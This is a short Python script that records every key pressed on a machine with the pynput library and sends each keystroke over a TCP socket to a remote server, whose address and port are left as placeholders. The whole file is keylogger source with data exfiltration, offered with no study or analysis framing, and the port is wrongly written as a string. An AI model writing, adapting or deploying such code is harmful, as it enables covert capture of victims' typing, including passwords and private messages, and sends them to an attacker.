import socket
from pynput.keyboard import Key, Listener

# Server info
server_ip = "serverip"
server_port = "serverport"

# Start Socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to server
try:
    client_socket.connect((server_ip, server_port))
    print("Established connection to server")
except Exception as e:
    print(f"Error connecting to the server: {e}")

def on_press(key):
    try:
        # Send key to server
        client_socket.send(str(key).encode())
    except Exception as e:
        print(f"Error sending data to server: {e}")

def on_release(key):
    if key == Key.esc:
        client_socket.close()
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
